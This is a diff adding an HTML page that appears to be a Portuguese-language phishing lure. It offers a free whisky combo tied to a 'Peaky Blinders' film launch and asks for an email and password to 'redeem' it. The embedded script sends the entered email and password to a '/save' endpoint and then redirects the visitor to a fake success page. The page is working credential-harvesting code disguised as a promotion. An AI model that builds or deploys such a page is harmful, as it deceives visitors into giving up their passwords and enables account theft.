@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Promoção Peaky Blinders</title>
+     <!-- Favicon -->
+     <link rel="icon" type="image/x-icon" href="https://www.pngkit.com/png/full/237-2377978_png-file-agent-symbol-png.png"> 
+    
+    <style>
+        body {
+            background-color: #161616;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            overflow: hidden; /* Prevent scrolling deixar fiquiso */
+        }
+        .content {
+            background-color: #1d1d1d;
+            padding: 0px;
+            border-radius: 10px;
+            height: 80vh; /* Ajuste este valor para controlar o quanto o conteúdo se estende para baixo */
+        }
+        
+        .yellow {
+            color: yellow;
+        }
+        .center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+        }
+        .button {
+            background-color: rgb(255, 208, 0);
+            border: none;
+            color: rgb(8, 8, 8);
+            padding: 9px 10px; /* Adjust padding to make the button slimmer */
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 5px; /* Adjust font size to make the button slimmer */           
+            cursor: pointer;
+            border-radius: 2px;
+            
+        }
+
+          /* ... */
+    input[type=email], input[type=password], .button {
+        width: 350px;  /* Ajuste a largura */
+        height: 50px;  /* Ajuste a altura */
+        font-size: 20px;  /* Ajuste o tamanho da fonte */
+        border-radius: 5px;
+        margin-bottom: 10px;        
+        
+    }    
+    
+     p {
+        font-size: 18px;
+    }
+    /* ... */
+    </style>
+</head>
+<!-- Colocar as Duas cor -->
+<div class="content">
+<body>    
+    <div class="center">
+        <p><span style="font-size: 30pt;"><img id="headerImage" src="https://github.com/burk8477/peaky-blinders/blob/main/public/logo.png?raw=true" alt="Header Image" width="200" height="50" /></span></p>
+        
+        <p><span style="font-size: 30pt;"><img id="headerImage" src="https://github.com/burk8477/peaky-blinders/blob/main/public/hero.png?raw=true" alt="Header Image" width="500" height="300" /></span></p>
+      
+        <p>Você ganhou um combo de Whisky <br> &emsp;Grátis em comemoração ao<br>lançamento do filme, para resgatar</p>
+
+        
+        <input type="email" id="email" name="email" placeholder="E-mail">
+        
+        <input type="password" id="password" name="password" placeholder="Senha">
+
+        <button class="button" onclick="enviarFormulario()" ontouchstart="enviarFormulario()">RESCATAR COMBO!</button>
+                 
+        <p style="color: rgb(185, 184, 184); font-size: 13px;">Ao resgatar você concorda com os Termos de Uso</p>
+        <h2>&emsp;</h2>        
+        <p style="font-size: 13px;">© 2023 Peaky Blinders</p>
+        <h2>&emsp;</h2>
+        <h2>&emsp;</h2>      
+        
+    </div>    
+    <script>
+        function enviarFormulario() {
+    event.preventDefault();
+
+    // Use the touchstart event for touch devices
+    if ('ontouchstart' in window) {
+        // Handle touch events here
+    }
+
+    var email = document.getElementById('email').value;
+    var senha = document.getElementById('password').value;
+    var logData = `Email: ${email}, Senha: ${senha}\n`;
+
+    fetch('/save', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ logData }),
+    });
+
+    window.location.href = '/login_success';
+        }
+    </script>  
+    
+</body>
+</html>
